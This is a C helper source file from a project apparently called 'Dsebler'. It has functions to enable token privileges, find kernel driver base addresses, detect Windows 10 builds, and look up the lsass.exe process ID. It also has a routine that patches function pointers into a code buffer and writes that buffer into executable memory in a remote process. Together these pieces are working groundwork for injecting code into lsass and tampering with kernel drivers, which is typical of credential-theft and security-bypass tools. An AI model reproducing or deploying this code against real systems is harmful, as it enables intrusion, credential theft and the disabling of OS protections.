/*
* Angelo Frasca Caccia
* 30/05/2024
* https://www.github.com/Dsebler
*/


#include "Dsebler.h"

BOOL SetPrivilege(HANDLE hToken, LPWSTR SePrivilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp = { 0 };
	PRIVILEGE_SET privs = { 0 };
	LUID luid = { 0 };
	BOOL status = FALSE;

	if (!LookupPrivilegeValueW(NULL, SePrivilege, &luid))
	{
		return status;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
	{
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	else
	{
		tp.Privileges[0].Attributes = 0;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		return status;
	}

	// test privs
	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

	PrivilegeCheck(hToken, &privs, &status);

	return status;
}

BOOL EnablePrivilege(LPWSTR SePrivilege)
{
	HANDLE currentProcessToken = NULL;
	BOOL status = FALSE;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentProcessToken) == TRUE)
	{
		status = SetPrivilege(currentProcessToken, SePrivilege, TRUE);
		CloseHandle(currentProcessToken);
	}

	return status;
}

LPVOID GetDriverBaseAddress(LPSTR DeviceDriverName)
{
	LPVOID tmp_array = 0;
	LPVOID result = 0;
	DWORD needed = 0, needed2 = 0;
	DWORD64 i = 0;
	char name[MAX_PATH];
	int j = 0;

	EnumDeviceDrivers(tmp_array, 0, &needed);
	if (needed > 0)
	{
		tmp_array = (LPVOID)LocalAlloc(LPTR, (SIZE_T)needed);
		if (tmp_array)
		{
			if (EnumDeviceDrivers(tmp_array, needed, &needed2))
			{
				for (i = 0; i < needed / sizeof(LPVOID); i++)
				{
					GetDeviceDriverBaseNameA(*(PVOID*)(PVOID*)((PBYTE)tmp_array + (8 * i)), name, MAX_PATH);
					if (_stricmp(name, DeviceDriverName) == 0)
					{
						RtlCopyMemory(&result, (PBYTE)tmp_array + (8 * i), sizeof(LPVOID));
						break;
					}
				}
			}
			//SecureZeroMemory(&tmp_array, (SIZE_T)needed);
			LocalFree(tmp_array);
		}
	}

	return result;

}

WINDOWS_VERSION GetOsBuildNumber()
{
	NTSTATUS status = 0;
	WINDOWS_VERSION iVersion = WINDOWS_UNSUPPORTED;
	RTL_OSVERSIONINFOW RtlOSVersion = { 0 };
	PRTLGETVERSION RtlGetVersion = 0;
	HMODULE hModule = 0;

	hModule = GetModuleHandle(L"ntdll.dll");
	if (hModule)
	{
		RtlGetVersion = (PRTLGETVERSION)GetProcAddress(hModule, "RtlGetVersion");
		if (RtlGetVersion)
		{
			RtlOSVersion.dwOSVersionInfoSize = sizeof(RtlOSVersion);
			status = RtlGetVersion(&RtlOSVersion);

			if ((status == STATUS_SUCCESS) && (RtlOSVersion.dwMajorVersion == 10))
			{
				switch (RtlOSVersion.dwBuildNumber)
				{
				case 14393:
					iVersion = WINDOWS_REDSTONE_1;
					break;

				case 15063:
					iVersion = WINDOWS_REDSTONE_2;
					break;

				case 16299:
					iVersion = WINDOWS_REDSTONE_3;
					break;

				case 17134:
					iVersion = WINDOWS_REDSTONE_4;
					break;

				case 17763:
					iVersion = WINDOWS_REDSTONE_5;
					break;

				case 18362:
					iVersion = WINDOWS_19H1;
					break;

				case 18363:
					iVersion = WINDOWS_19H2;
					break;

				case 19041:
					iVersion = WINDOWS_20H1;
					break;

				case 19042:
					iVersion = WINDOWS_20H2;
					break;

				case 19043:
					iVersion = WINDOWS_21H1;
					break;

				case 19044:
					iVersion = WINDOWS_21H2;
					break;

				case 19045:
					iVersion = WINDOWS_22H2;
					break;

				default:
					iVersion = WINDOWS_UNSUPPORTED;
					break;
				}
			}

			SecureZeroMemory(&RtlOSVersion, sizeof(RTL_OSVERSIONINFOW));
		}
	}

	return iVersion;

}

DWORD GetLsaProcessId()
{
	DWORD result = 0;
	HANDLE hSnap = 0;
	PROCESSENTRY32W entry32 = { 0 };

	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap)
	{
		entry32.dwSize = sizeof(PROCESSENTRY32W);
		if (Process32First(hSnap, &entry32))
		{
			while (Process32Next(hSnap, &entry32))
			{
				if (_wcsicmp(entry32.szExeFile, L"lsass.exe") == 0)
				{
					result = entry32.th32ProcessID;
					break;
				}
			}
			SecureZeroMemory(&entry32, sizeof(PROCESSENTRY32W));
		}
		CloseHandle(hSnap);
	}

	return result;

}

LPVOID ReplaceFakePointers(HANDLE hProcess, LPVOID buffer, DWORD DataSize, PREPLACEABLE_POINTER pReplPointers, DWORD count)
{
	LPVOID RemoteHandler = 0;
	BOOL status = FALSE;
	HMODULE hModule = 0;
	DWORD i = 0, j = 0;

	for (i = 0; i < count; i++)
	{
		if ((pReplPointers[i].RealPtr == NULL) && (pReplPointers[i].Module != NULL) && (pReplPointers[i].FakePtr != NULL) && (pReplPointers[i].Name != NULL))
		{
			hModule = GetModuleHandle(pReplPointers[i].Module);
			if (hModule == NULL)
			{
				hModule = LoadLibrary(pReplPointers[i].Module);
			}
			if (hModule != NULL)
			{
				pReplPointers[i].RealPtr = (PVOID)GetProcAddress(hModule, pReplPointers[i].Name);
			}
			else
				goto error;
		}
	}

	for (i = 0; i < count; i++)
	{
		if ((pReplPointers[i].FakePtr != NULL) && (pReplPointers[i].RealPtr == NULL))
			goto error;
	}

	for (i = 0; i < count; i++)
	{
		for (j = 0; j < DataSize - sizeof(PVOID); j++)
		{
			if (*(LPVOID*)((PBYTE)buffer + j) == pReplPointers[i].FakePtr)
			{
				*(LPVOID*)((PBYTE)buffer + j) = pReplPointers[i].RealPtr;
				j += sizeof(PVOID) - 1;
			}
		}
	}

	RemoteHandler = VirtualAllocEx(hProcess, NULL, DataSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (RemoteHandler)
	{
		if (!WriteProcessMemory(hProcess, RemoteHandler, buffer, DataSize, NULL))
		{
			VirtualFreeEx(hProcess, RemoteHandler, 0, MEM_RELEASE);
			goto error;
		}
	}

	return RemoteHandler;

error:
	return 0;

}